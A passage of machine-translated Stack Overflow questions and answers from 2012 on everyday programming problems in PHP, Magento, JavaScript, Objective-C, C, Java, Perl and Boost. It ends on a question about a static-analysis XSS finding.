     * @param string $serialized
     */
    public function unserialize($serialized)
    {
        list(
            $this->id,
            $this->url_screenshot
        ) = unserialize($serialized);
    }

    public function __toString() {
        return "id: ".$this->id
              ."screenshot: ".$this->url_screenshot;
    }
} 
```

我想对这种 xml 进行序列化/反序列化：

```
<?xml version="1.0" encoding="UTF-8" ?>
<screenshots>
   <screenshot>
      <id>1</id>
      <url_screenshot>screenshot_url1</url_screenshot>
   </screenshot>
   <screenshot>
      <id>2</id>
      <url_screenshot>screenshot_url2</url_screenshot>
   </screenshot>
   <screenshot>
      <id>3</id>
      <url_screenshot>screenshot_url3</url_screenshot>
   </screenshot>
</screenshots> 
```

我真的很想在 Sf2 中使用集成/集成的东西（“平滑”的东西），并且更喜欢避免使用任何自制的 xml 解析器。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-12T07:55:52.407

由于 XML 的性质，您想要的确切内容是不可能的。你总是需要一些东西来翻译 object -> xml 和 xml -> object。

我对您的建议将是一个作为集合工作并为您处理它的类，将对象列表作为属性保存，可以从 xml 输入创建并从现有对象创建 xml 输出。

另一种方法（如果您不再需要将其作为 xml 文件）将简单地序列化对象并以这种方式存储它们，或者如果您想要一次全部序列化数组（或集合对象）。PHP 中的普通 serialize() 和 unserialize() 函数可以解决问题。由于它只是数据，因此您甚至不需要类中的方法序列化和反序列化。

**更新：**如果只是将 XML 放入一个对象中，那么 simplexml 已经涵盖了您： [http ://www.php.net/manual/en/function.simplexml-load-string.php](http://www.php.net/manual/en/function.simplexml-load-string.php)

第二个参数是类名。

Quote: 您可以使用此可选参数，以便 simplexml_load_string() 将返回指定类的对象。该类应该扩展 SimpleXMLElement 类。

如果这只是您的目标，那么 simplexml 已经做到了。

**更新 2：**我已经阅读了更多内容。它不会做你想做的事。它需要一个对象并将其序列化为 XML/YAML，然后当然会从这些序列化状态再次反转该过程。它不能把一些随机的 XML 文件变成一个完美的对象。

# magento - 登录时自动将商品添加到购物车：默认行为？

> ID：10114593
> 
> 赞同：0
> 
> 时间：2012-04-11T22:00:53.387
> 
> 标签：magento

John 访问 bestwidgets.com 并将 5 个红色小部件放入他的购物车，登录然后决定不购买红色小部件并退出。

约翰第二天回来（回到同一台机器）并决定他需要的是蓝色小部件。他在他的购物车中添加了 5 个蓝色小部件并继续结帐。然后，他登录并继续通过单页结帐进行卡车运输。只有在他完成购买后，他才意识到**5 个红色小部件已自动添加到他的购物车**中（当他登录时，尽管大多数人甚至不会意识到这一点）。

John 现在认为 bestwidgets.com 是骗子，取消了他的订单并且再也没有回来。

我在这里遗漏了什么还是这是magento的默认行为！？？

Magento 社区 1.5.1.0

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T18:12:53.773

这是 Magento 中的默认行为，但这与“持久购物”功能无关，而是与“报价生命周期”有关。与 Magento 一样，我们将商店应该如何运作的决定留给了经营商店的商家，因为他们最了解自己的市场以及配置商店的最佳方式是什么。如果您在“购物车”选项卡中转到“销售”->“结帐”下的“系统”->“配置”，您应该能够设置记住报价（或购物车）的天数（报价有效期（天））。将其设置为 0 不应记住客户每次登录之间的购物车。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-12T15:36:47.347

如果您使用 Enterprise:`Enterprise_Persistent`和/或 Community`Mage_Persistent`通过相应的 XML 禁用它们`app/etc/modules`以禁用此功能，如果您担心客户在结帐时没有意识到他们以前添加的产品在他们的购物车中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T21:05:26.690

> 我在这里遗漏了什么还是这是magento的默认行为！？？

是的，这是 Magento 的默认行为。我了解您对此的不信任感的看法，但是，我相信大多数人会说这是为了帮助客户记住他们在看什么并帮助他们花钱。细微的差别...

# javascript - 草坪椅代码执行两次

> ID：10114595
> 
> 赞同：1
> 
> 时间：2012-04-11T22:01:00.127
> 
> 标签：javascript, lawnchair

我正在尝试使用 Lawnchair，发现它似乎执行了所有功能两次。这可能只是我在使用 JavaScript 时做错的事情。这是一个示例，除了演示我的问题之外什么都不做。

```
console.log("Flag 1");

Lawnchair(function() {
    console.log("Flag 2");
}); 
```

在此示例中，控制台显示了这一点。

```
Flag 1
Flag 2
Flag 2 
```

因此，虽然整个代码部分只被调用一次，但内部函数确实被调用了两次。

这是语法问题吗？

# javascript - 尝试在 ASP.Net 中使用 jquery 数据表的 Jscript 运行时错误

> ID：10114596
> 
> 赞同：1
> 
> 时间：2012-04-11T22:01:01.203
> 
> 标签：javascript, jquery, asp.net, plugins

当我尝试访问应该显示带有来自 datatables.net 的 jquery 插件的表格的页面时，出现以下错误：

Microsoft JScript 运行时错误：对象不支持属性或方法“dataTable”

这是我在我的页面上引用各种脚本/插件的地方：

```
<script type="text/javascript" src="http://ajax.aspnetcdn.com/ajax/jquery/jquery-1.6.2.min.js"></script>
<script type="text/javascript" src="http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/jquery.dataTables.min.js" ></script>
<script type="text/javascript" src="Script/jquery.tools.min.js"></script>
<script type="text/javascript" src="Script/superfish.js"></script>
<script src="Script/jquery.MultiFile.js" type="text/javascript"></script>
<script type="text/javascript" src="Script/supersubs.js"></script> 
```

这是我试图在表上调用 dataTable 函数的地方（使用 id mod123）：

```
<script type="text/javascript">
    $(document).ready(function() {
        $('#mods123').dataTable();
    });
</script> 
```

我的表中有一个 thead 和 tbody 标记，但是当我构建项目并在本地运行它并导航到页面时，它给了我这个错误。当我在不同的浏览器中转到该页面时，当然不会显示错误，但是我试图影响的表没有以任何方式改变。

当我在 Firebug 中查看页面时，它给了我以下错误： $("#mods123").dataTable is not a function

Chrome 的调试器说“未捕获的类型错误：对象 [对象对象] 没有方法 'dataTable'

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:16:20.863

看起来您的 jQuery 版本与 dataTables 不兼容。尝试使用 dataTables 附带的 jQuery 版本。我认为它是 jQuery 1.7.1。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T12:19:23.473

好吧，看来这实际上是数据表和 jquery 工具之间的冲突。当我删除对 j​​query 工具的引用时，它起作用了！

我不认为我们目前正在使用 jquery 工具，所以我可能没问题，但如果没有，我该如何避免这种冲突？我找不到对此的具体参考，所以我想知道它是否曾经用于旧版本的工具，但他们已经修复了它？但是再一次，我似乎找不到任何提及...

# iphone - 在 Xcode 中使用拆分数据查找用户位置附近的数据

> ID：10114599
> 
> 赞同：0
> 
> 时间：2012-04-11T22:01:16.153
> 
> 标签：iphone, xcode, json, core-location, userlocation

我试图弄清楚如何在 iPhone 上找到用户位置附近的数据（来自 JSON）。

我的输入由两部分组成，所以为了到达城市和地址，我必须从用户所在的省份获得一个 ID。

1.  省（带ID去该省所有Json数据）
2.  数据（每条数据都有名称、城市、地址……）

是否可以找到用户所在的省份。然后通过将所有地址和城市反转为坐标，传递其 ID 以搜索靠近用户定位事件的数据列表，...？

我对基于位置的编程很陌生！任何帮助表示赞赏！

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T11:14:10.723

您要做的第一件事是将 CoreLocation 添加到您的应用程序中。[本教程](http://www.techotopia.com/index.php/Getting_iPhone_Location_Information_using_the_iOS_5_Core_Location_Framework)向您展示了如何做到这一点。这将为您提供当前位置的纬度和经度。

您要做的下一件事是对您的坐标进行*反向地理编码。*一种常见的 API 是[Google Geocoding API](https://developers.google.com/maps/documentation/geocoding/)。这会给你你的省名。

# perl - Perl：以编程方式删除 PostgreSQL 表索引，然后在使用 DBD::Pg 进行复制后重新创建

> ID：10114605
> 
> 赞同：1
> 
> 时间：2012-04-11T22:01:53.800
> 
> 标签：perl, postgresql, dbi, dbd-pg

我正在将多个表（约 150 万条记录）从一个数据源复制到另一个数据源，但这需要很长时间。我希望加快我对 DBD::Pg 的使用速度。

我目前正在使用 pg_getcopydata/pg_putcopydata，但我认为目标表上的索引正在减慢进程。

我发现我可以使用 找到有关表索引的一些信息`$dbh->statistics_info`，但我很好奇是否有人有编程方式根据这些信息动态删除/重新创建索引。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:12:42.923

我猜，编程方式是`CREATE INDEX`通过 DBI 提交适当的 SQL 语句，您将输入`psql`.

有时在复制大表时，最好按以下顺序进行：

*   创建没有索引的表
*   复制数据
*   添加索引

# php - 处理 html 中的文本并重新插入到 html 结构中

> ID：10114607
> 
> 赞同：0
> 
> 时间：2012-04-11T22:02:05.493
> 
> 标签：php, html

我想从 HTML 中获取文本做一些处理并更改它并使用 php 重新插入该 HTML 代码。

```
<p>This is my    sentence   <span>and   more</span> also <strong>important</strong> part.</p> 
```

最好的方法是什么？使用 preg_* ？如何将我的文本重新插入 HTML 样式？

例如，我想删除单词之间的所有双倍或更多空格。

```
preg_replace('/\s+/', ' ', $myText); 
```

但我只想应用在我的 html 文本中，而不是 html 标签、属性等...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:05:54.307

看看 DomDocument。它允许您对 HTML 进行一些操作。

[http://www.php.net/manual/en/domdocument.loadhtml.php](http://www.php.net/manual/en/domdocument.loadhtml.php)

**编辑**

如果您想详细说明您想要对 HTML 示例执行的操作，我们或许可以提供更具体的答案 :)

**编辑**

为了反映更新的答案：HTML 中的多个空格无论如何都应该折叠，但如果你想删除它们，那么你可以尝试以下操作：

```
$result = preg_replace_callback('/(?<=\>)[\w\s]+(?=\<)/', function($match) {
    return preg_filter('/\s+/', ' ', $match[0]);
}, $str); 
```

我无论如何都不是正则表达式专家，所以我确信有一种更优雅的方法可以做到这一点，但这可能对你有用：首先做 a`preg_replace_callback`并使用环视来抓取结束和开始标签之间的任何文本片段。然后，通过`preg_filter`(or `preg_replace`) 传递结果以将任何多个空格替换为单个空格。

希望这会有所帮助/有效:)

# objective-c - NSNumber doubleValue 方法在目标 C (IOS) 中返回 null

> ID：10114612
> 
> 赞同：0
> 
> 时间：2012-04-11T22:02:36.840
> 
> 标签：objective-c, ios, nsnumber

我正在做一些 iOS 学习，我有一个 NSNumber，它似乎是有序的，但是当我要求它的 doubleValue 时，我得到 null。

```
[stack addObject: [NSNumber numberWithDouble:operand]]
id topOfStack = [stack lastObject];
if([topOfStack isKindOfClass:[NSNumber class]]){
    NSLog(@"%@",topOfStack);
    NSLog(@"%@",[topOfStack class]);
    result  = [topOfStack doubleValue];
    NSLog(@"%@",result);
} 
```

这打印：

```
2012-04-11 17:52:04.909 RPNCalc[4127:f803] 3
2012-04-11 17:52:04.910 RPNCalc[4127:f803] __NSCFNumber
2012-04-11 17:52:04.910 RPNCalc[4127:f803] (null) 
```

为什么 doubleValue 会显示为空？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:05:48.213

您得到 NULL 因为 %@ 是对象的字符串文字。双打不是对象。使用 %f 来 NSLog 一个浮点数或双精度数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T22:06:02.377

替换 NSLog(@"%@",topOfStack); 与 NSLog(@"%g",topOfStack);

# c - 点在 C 中特定距离的直线上

> ID：10114623
> 
> 赞同：0
> 
> 时间：2012-04-11T22:03:48.273
> 
> 标签：c, 2d, euclidean-distance

如何找到与给定点相距特定距离的直线上的点。我正在用 C 编写这段代码，但我没有得到正确的答案..你能指导我做错什么吗？

我得到了 x1,y1,x2,y2 值和留下的距离。使用这些我可以找到斜率 m 和 y 截距也很好。现在，我需要在连接这两个点的直线上找到距离点 x1,y1 10 个单位的点。我似乎在这里出错了。这是我写的代码。

```
int x1 = node[n].currentCoordinates.xCoordinate;
int y1 = node[n].currentCoordinates.yCoordinate;
int x2 = node[n].destinationLocationCoordinates.xCoordinate;
int y2 = node[n].destinationLocationCoordinates.yCoordinate;

int distanceleft = (y2 - y1) * (y2 - y1) + (x2 - x1) * (x2 - x1);
distanceleft = sqrt(distanceleft);
printf("Distance left to cover is %d\n",distanceleft);
int m = (y2 - y1)/(x2 - x1); // slope.
int b = y1 - m * x1; //y-intercept

//find point on the line that is 10 units away from
//current coordinates on equation y = mx + b.
if(x2 > x1)
{
     printf("x2 is greater than x1\n");
     int tempx = 0;
     int tempy = 0;
     for(tempx = x1; tempx <= x2; tempx++)
     {
          tempy = y1 + (y2 - y1) * (tempx - x1)/(x2 - x1);
          printf("tempx = %d, tempy = %d\n",tempx,tempy);
          int distanceofthispoint = (tempy - y1) * (tempy - y1) + (tempx - x1) * (tempx - x1);
          distanceofthispoint = sqrt((int)distanceofthispoint);
          if(distanceofthispoint >= 10)
          {
               //found new points.
               node[n].currentCoordinates.xCoordinate = tempx;
               node[n].currentCoordinates.yCoordinate = tempy;
               node[n].TimeAtCurrentCoordinate = clock;
               printf("Found the point at the matching distance\n");
               break;
          }
     }
}
else
{
     printf("x2 is lesser than x1\n");
     int tempx = 0;
     int tempy = 0;
     for(tempx = x1; tempx >= x2; tempx--)
     {
          tempy = y1 + (y2 - y1) * (tempx - x1)/(x2 - x1);
          printf("tempx = %d, tempy = %d\n",tempx,tempy);
          int distanceofthispoint = (tempy - y1) * (tempy - y1) + (tempx - x1) * (tempx - x1);
          distanceofthispoint = sqrt((int)distanceofthispoint);
          if(distanceofthispoint >= 10)
          {
               //found new points.
               node[n].currentCoordinates.xCoordinate = tempx;
               node[n].currentCoordinates.yCoordinate = tempy;
               node[n].TimeAtCurrentCoordinate = clock;
               printf("Found the point at the matching distance\n");
               break;
          }
     }
}
printf("at time %f, (%d,%d) are the coordinates of node %d\n",clock,node[n].currentCoordinates.xCoordinate,node[n].currentCoordinates.yCoordinate,n); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-11T22:17:43.837

数学是这样的，我没有时间用 C 写东西。

你有一个观点`(x1,y1)`和另一个观点`(x2,y2)`，当链接时它会给你一个片段。

因此，您有一个方向向量`v=(xv, yv)`where`xv=x2-x1`和`yv=y2-y1`。

现在，您需要将此向量除以其范数，得到一个新向量：*vector = v / sqrt(xv ² + yv ² )*。

现在，您只需将向量乘以您想要的点的距离添加到您的原点：

*位置=（x原点，y原点）+距离×向量*

我希望这有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-29T18:10:35.747

或者更简单，

从斜坡找到角度

```
θ = arctan(y2-y1/x2-x1) 
```

您可能希望根据斜率的分子和分母来修改 θ 的象限。然后你可以找到距离 (x1, y1) 距离为 d 的线上的任何点

```
x_new = x1 + d×cos(θ)
y_new = y1 + d×sin(θ) 
```

在这种情况下，您有 d=10

# java - Java 类转换异常

> ID：10114624
> 
> 赞同：0
> 
> 时间：2012-04-11T22:03:48.353
> 
> 标签：java, exception

我现在正在进行的项目涉及我从文本文件中读取单词并将它们加载到数组中（最终是二叉树，但这将在稍后完成）。我必须将单词和单词的频率（最初为 1）都加载到数组中，因此我将两个变量都打包到一个 object`WordNode`中。我能够将单词加载到数组中，但是当我尝试检查单词是否已经在数组中时，事情就崩溃了。如果是，我必须将频率增加 1。我编写了一个新`equals()`方法来覆盖默认方法，以便比较单词而不是变量引用。但是，我现在收到错误消息`Exception in thread "main" java.lang.ClassCastException: [Ljava.lang.Object; cannot be cast to [LWordNode;`。为什么会出现这种情况？我以为只有`WordNode`对象被传递给`equals()`.

主要方法：

```
public class Driver {
/////////////// fields ///////////////
public static ArrayUnorderedList<WordNode> wordArray = new ArrayUnorderedList<WordNode>();
public static LinkedBinarySearchTree<WordNode> wordTree = new LinkedBinarySearchTree<WordNode>();   //tree to hold words

/////////////// methods ///////////////
public static void main(String[] args) throws Exception {
    //ask for filename       
    BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
    System.out.println("Enter the name of the file to read from: ");
    Reader file = new FileReader(reader.readLine());

    //read file
    Scanner input = new Scanner(file);

    while(input.hasNext()) {
        //get words from file
        String word = input.next();

        //remove non-word characters and convert to lowercase
        word = word.replaceAll("\\W", "");
        word = word.toLowerCase();

        //create node
        WordNode newWord = new WordNode(word);

        //if word is already in array
        if(wordArray.contains(newWord)) {
            System.out.println("Word is already in array");

            //increment frequency by 1
            int index = wordArray.find(newWord);
            wordArray.list[index].setFrequency(wordArray.list[index].getFrequency() + 1);
            System.out.println("(" + newWord.getFrequency() + ") " + newWord.getWord());
        } else {
            System.out.println("Word is not yet in array");

            //add word to tree
            System.out.println("(" + newWord.getFrequency() + ") " + newWord.getWord());
            wordArray.addToRear(newWord);
        }
    }

    //insert into tree

    //perform traversals on tree
} 
```

WordNode 类：

```
public class WordNode {
   protected String word;
   protected WordNode left, right;
   protected int frequency;

   /**
    * Creates a new node with the specified data.
    * @param obj the element that will become a part of the new node
    */
   WordNode(String obj) {
      word = obj;
      left = null;
      right = null;
      frequency = 1;
   }

   /**
    * Method to check for string equivalence.
    * @return true if words are the same
    */
   public boolean equals(Object obj) {
       WordNode tempWord = (WordNode)obj;
       return(tempWord.getWord().equals(this.word));
   }

   /**
    * Gets the word.
    * @return the word
    */
   public String getWord() {
      return word;
   }

   /**
    * Sets the word.
    * @param word the word to set
    */
   public void setWord(String word) {
      this.word = word;
   }

   /**
    * Gets the left.
    * @return the left
    */
   public WordNode getLeft() {
      return left;
   }

   /**
    * Sets the left.
    * @param left the left to set
    */
   public void setLeft(WordNode left) {
      this.left = left;
   }

   /**
    * Gets the right.
    * @return the right
    */
   public WordNode getRight() {
      return right;
   }

   /**
    * Sets the right.
    * @param right the right to set
    */
   public void setRight(WordNode right) {
      this.right = right;
   }

   /**
    * Gets the frequency.
    * @return the frequency
    */
   public int getFrequency() {
      return frequency;
   }

   /**
    * Sets the frequency.
    * @param frequency the frequency to set
    */
   public void setFrequency(int frequency) {
      this.frequency = frequency;
   }
} 
```

ArrayList 类的一些方法：

```
/**
* Returns true if this list contains the specified element.
* @param target the element that the list is searched for
* @return true if the target is in the list, false if otherwise 
*/
public boolean contains(T target) {
    return (find(target) != NOT_FOUND);
}

/**
* Returns the array index of the specified element, or the
* constant NOT_FOUND if it is not found.
* @param target the element that the list will be searched for
* @return the integer index into the array containing the target element, or the NOT_FOUND constant
*/
public int find(T target) {
    int scan = 0, result = NOT_FOUND;
    boolean found = false;

    if (!isEmpty()) {
       while (!found && scan < rear) {
          if (target.equals(list[scan])) {
              found = true;
          } else {
             scan++;
          }
       }
    }

    if (found) {
       result = scan;
    }

    return result;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T22:10:59.873

一种可能的原因是您的`equals`方法：

```
public boolean equals(Object obj) {
    //You need to check that obj is a WordNode
    //For example: if (obj instanceof WordNode) {...
    WordNode tempWord = (WordNode)obj; 
    return(tempWord.getWord().equals(this.word));
} 
```

如果 obj 不是 WordNode，将抛出异常。

你应该看看[这个关于如何在 Java 中覆盖 equals 和 hashcode 的讨论](https://stackoverflow.com/questions/27581/overriding-equals-and-hashcode-in-java)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:35:47.980

当您使用泛型时，Java[会删除类型信息](http://docs.oracle.com/javase/tutorial/java/generics/erasure.html)并在运行时执行强制转换。这意味着如果您的代码的任何部分包含`T[]`，它将被编译为`Object[]`。

根据对`wordArray.list[index].setFrequency()`and的引用`wordArray.list[index].getFrequency()`，看起来您已用作ArrayUnorderedList 字段的类型`T[]`。`list`这不是对泛型的正确使用。Java 将尝试`Object[] list`在`WordNode[]`访问数组的索引之前强制转换为。将一种数组类型转换为另一种数组类型将始终产生 ClassCastException。

考虑在 ArrayUnorderedList 中`list`实现一个方法，而不是直接访问该字段。`public T get(int index)`在方法签名中使用泛型类型`T`是在泛型集合中实现对象访问的正确方法。这里，隐式转换发生*在*数组访问之后。

或者，考虑改用 java.util.ArrayList 或 java.util.HashSet 类。两者都是通用集合。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:15:06.800

除了应该始终使用 WordNode 参数调用 equals 方法外，不要这样做。

您必须验证参数对象的类型

```
public boolean equals(Object obj) {
   if(!(obj instanceof WordNone)){
     return false;
   }
   // rest of equals method
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T22:15:28.340

假设在 equals 中传递的内容将始终是同一对象的实例是不安全的。你需要做一些检查，比如

```
public boolean equals(Object obj) {
    if (this == obj) {
        return true;
    }
    if (obj == null) {
        return false;
    }
    if (getClass() != obj.getClass()) {
        return false;
    }
    WordNode otherWord = (WordNode) obj;

    return(otherWord.getWord().equals(this.word));
} 
```

无论如何，你为什么不使用 a`Set`代替？这是您可以用于您的案例的最佳数据结构。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-13T14:26:24.217

既然您只关心一个单词及其频率，为什么不使用 Map 或 Set 呢？键是单词，值是频率。这样，您只需调用 Map.contains(word) 并查看它是否已经存在，然后做任何您想做的事情。

# node.js - 如何使用 node-java 模块在枚举类型的实例中创建

> ID：10114625
> 
> 赞同：2
> 
> 时间：2012-04-11T22:04:00.173
> 
> 标签：node.js

我正在寻找使用 node.js 的 node-java 插件创建枚举类型的实例。

我浏览了他们的示例，但是没有看到任何枚举类型的示例。我有一个构造函数，它的输入是枚举类型。我正在寻找类似的东西：

```
var java = require("./node-java/index.js");
java.classpath.push("./DatabaseConnection.jar");

var DBType = java.newInstanceSync("database.ConnectionDB$SupportedDBTypes", "SQLServer");       
var conn = java.newInstanceSync("database.ConnectionDB", "192.168.2.100", 1360, "SQLEXPRESS", "LogDB_Admin", "sa", "pw", DBType ); 
```

DatabaseConnection.jar 有一个名为 ConnectionDB 的类，其中包含一个名为 SupportedDBTypes 的枚举类型，其中一种类型是 SQLSERVER。

# php - DOMDocument->saveHTML() 转换为空格

> ID：10114627
> 
> 赞同：5
> 
> 时间：2012-04-11T22:04:05.643
> 
> 标签：php, domdocument, html-entities

在我的代码中，我有

```
$document = DomDocument->loadHTML($someHTML);
$xPath = new DOMXPath($document);
//
//do some xpath query and processing
//
$result = $document->saveHTML(); 
```

我正在处理的 html 包含：

```
<html>
<body>
<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><b><span style='font-size:9.0pt;font-family:"ArialNarrow","sans-serif";
color:red'>&nbsp;</span></b></p>
</body>
</html> 
```

并导致：

```
<html>
<body>
<p class="MsoNormal" style="margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none"><b><span style='font-size:9.0pt;font-family:"ArialNarrow","sans-serif";
color:red'> </span></b></p>
</body>
</html> 
```

如何防止`&nbsp;`转换为空格？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-12T03:16:08.747

```
$someHTML = str_replace ('&nbsp;', '@nbsp;', $someHTML);
$document = DomDocument->loadHTML($someHTML);
$xPath = new DOMXPath($document);
//
//do some xpath query and processing
//
$result = $document->saveHTML();
$result = str_replace ('@nbsp;', '&nbsp;', $result); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:28:33.863

替换   与 &nbsp; 然后当读取 htmlDom 文档时，它将返回

# php - 格林威治标准时间到实时

> ID：10114638
> 
> 赞同：0
> 
> 时间：2012-04-11T22:05:07.333
> 
> 标签：php, jquery, mysql

我正在做一个项目，我需要能够使用 Jquery 获取 GMT 时间并通过 PHP 将其发布到 MYSQL DB 中。然后我需要获取用户的本地时间因素并将其保存到数据库中。之后使用 JS/JQuery 将 GMT 转换为用户本地时间。如果可能的话，我希望有人能给我一个代码示例。我真的很感谢你的时间，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:11:27.337

在不让用户手动选择他们的时区的情况下，一种方法是使用 javascript 日期对象来收集有关用户本地时间的信息，并在后续请求中使用它

```
var timestamp = new Date();
document.getElementById('timestamp_target').value = timestamp.getTimezoneOffset(); 
```

我在格林威治标准时间 +10 点在澳大利亚，getTimezoneOffset 返回的值为 -600 分钟

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:11:45.810

以此为起点：

[将用户的时区与网站的办公地点时区进行比较](https://stackoverflow.com/questions/6178951/compare-users-time-zone-with-the-websites-office-location-time-zone)

随后使用 AJAX 将数据发布到 php 脚本，该脚本将其插入到数据库中。一个快速的谷歌搜索会告诉你这一点。

# boost - boost.odeint 中任意类型的要求

> ID：10114639
> 
> 赞同：3
> 
> 时间：2012-04-11T22:05:09.957
> 
> 标签：boost, operator-overloading, numeric, numerical-methods

在 boost.odeint（boost 常微分方程求解器）中有一些使用[任意精度](http://headmyshoulder.github.com/odeint-v2/doc/boost_sandbox_numeric_odeint/tutorial/special_topics.html#boost_sandbox_numeric_odeint.tutorial.special_topics.using_arbitrary_precision_floating_point_types)和[矩阵的例子。](http://headmyshoulder.github.com/odeint-v2/doc/boost_sandbox_numeric_odeint/tutorial/special_topics.html#boost_sandbox_numeric_odeint.tutorial.special_topics.using_matrices_as_state_types)

我想在不同类型的坐标（笛卡尔坐标、极坐标或作用角）中使用 odeint 原子。

我应该为原子重载哪些操作？+,-, 最小值, 最大值, pow?

我可以在哪个文件中查找 odeint 使用了哪些操作？

**从[默认代数](https://github.com/headmyshoulder/odeint-v2/blob/master/boost/numeric/odeint/algebra/default_operations.hpp)**更新（1）**，它看起来需要 "+","*" 和 abs(), max()**

 *** * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-12T08:40:28.063

抱歉，回答的时间很长，但我觉得某种澄清会有所帮助：

通常，在 odeint 中有两种专门化类型的方法。

一种方法是专门化代数，这些代数被认为可以适应一个容器或集合的迭代方式，例如 a `std::vector`、`std::array`、`ublas::matrix`等。在 odeint 中存在一些预定义的代数：

*   `range_algebra`它适用于所有满足 boost.range 范围概念的容器
*   `fusion_algebra`对于编译时序列
*   `vector_space_algebra`它将迭代引导到操作。
*   `thrust_algebra`与推力一起使用 - 一个类似 STL 的 CUDA 框架

适应特殊类型的第二种可能性是被认为允许您指定如何对容器元素执行基本操作的操作。这里存在一些预定义的操作

*   `default_operations`它适用于大多数类型，如`double`, `float`, `std::complex<>`, ...`default_operations`仅假设定义了运算符 +,-,*,/ 以及基本函数，如`abs`, `max`。
*   `thrust_operation`用于推力

如果我正确理解您的问题，您有一种或多种类型的点可以存在于不同的坐标系中，因此这种类型的运算符必须适应 odeint。在这种情况下，您可以`range_algebra`将 'default_operations' 结合使用：假设您的类型被调用`point_type`并且它基本上由双精度数组成，这是主要的浮点类型。为了使用您需要的“default_operations”

*   `point_type operator+( point_type , double );`
*   `point_type operator+( double , point_type );`
*   `point_type operator+( point_type , point_type );`
*   `point_type operator*( point_type , double );`
*   `point_type operator*( double , point_type );`
*   `point_type operator/( point_type , double );`
*   `double abs( point_type );`

我认为这就是所有需要的。然后你应该能够在容器中使用你的 point_type `vector`，`array`等等。在 odeint 中也有一个例子，展示了如何适应特殊的点类型：[solar system](https://github.com/headmyshoulder/odeint-v2/blob/master/libs/numeric/odeint/examples/solar_system.cpp) with [point types](https://github.com/headmyshoulder/odeint-v2/blob/master/libs/numeric/odeint/examples/point_type.hpp)。如果您使用 Boost.Operators 库，这非常容易。

**编辑：**修正了一些错别字。**

# javascript - 缩短 javascript/jquery 函数

> ID：10114642
> 
> 赞同：0
> 
> 时间：2012-04-11T22:05:33.840
> 
> 标签：javascript, jquery, function

我有一个 javascript 函数，它使分配的文本在 2 种颜色、灰色和我运行该函数时设置的颜色值之间交替。

这是我使用的代码。功能：

```
function flashtext(ele,col) {
var tmpColCheck = document.getElementById( ele ).style.color;

  if (tmpColCheck === 'gray') {
    document.getElementById( ele ).style.color = col;
  } else {
    document.getElementById( ele ).style.color = 'gray';
  }
} 
```

然后对于我做的每个独特的闪光（内容是即时生成的）：

```
 setInterval(function() {
        flashtext('flashingtext1','#ffffff'); 
        }, 500 ); 
```

数字`flashingtext`,`flashingtext2`每增加一个就递增，并且颜色设置为它将交替使用的颜色，在本例中为白色。

然后

```
<span id='flashingtext2'>flash me</span> 
```

有什么办法可以修剪整个代码，这样我就不必为每个发生的实例添加新的 javascript。所以我可以把这个功能关闭，然后在 span 标签中定义其余的？就像是

```
<span id=flashingtext data=#ffffff> flash white </span> 
```

我给的颜色总是在那个和灰色之间交替

基本上，剪掉中间部分。

注意：如果可以提供更简单的方法，也可以使用 jquery。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:13:44.450

使用 jQuery，您可以在元素上切换类并让每个类设置颜色

```
setTimeout(function() {
$('#flashText').toggleClass('gray');
}, 500); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:25:19.637

如果您希望将相同的代码应用于所有实例，则为元素提供一个通用类，例如“flashtext”，以便您可以将它们作为一个组进行选择，但使用内联样式设置各个颜色：

```
<span class='flashingtext' style='color: white'>flash me</span> 
```

然后有一个“灰色”类：

```
span.gray { color : gray !important;}​ 
```

它使用`!important`它可以覆盖内联样式。

然后您的函数可以选择所有具有该“闪烁文本”类的元素并打开或关闭“灰色”：

```
setInterval(function() {
   $(".flashingtext").toggleClass("gray");
}, 500); 
```

演示：http: [//jsfiddle.net/yenK9/](http://jsfiddle.net/yenK9/)

如果您需要为`id`跨度分配一个，以便您可以单独选择它们以用于其他目的，那么请继续，但对于这种颜色您不需要。

# java - 使用 Ajax 和基于 Java 的服务器的 Web 应用程序 - 安全相关

> ID：10114643
> 
> 赞同：2
> 
> 时间：2012-04-11T22:05:40.160
> 
> 标签：java, ajax, security, xss

我有一个使用 Ajax 执行多项任务的 Web 应用程序。它有 Java 作为中间件（Struts 1.x）

问题是我的应用程序使用静态代码分析进行了潜在的安全风险分析。分析发现，使用以下代码被认为是易受攻击的。

例如

```
// Method invoked by Ajax
public ActionForward execute(...)
{
    PrintWriter out = response.getWriter();

    out.println("Ajax Response");

    return null;
} 
```

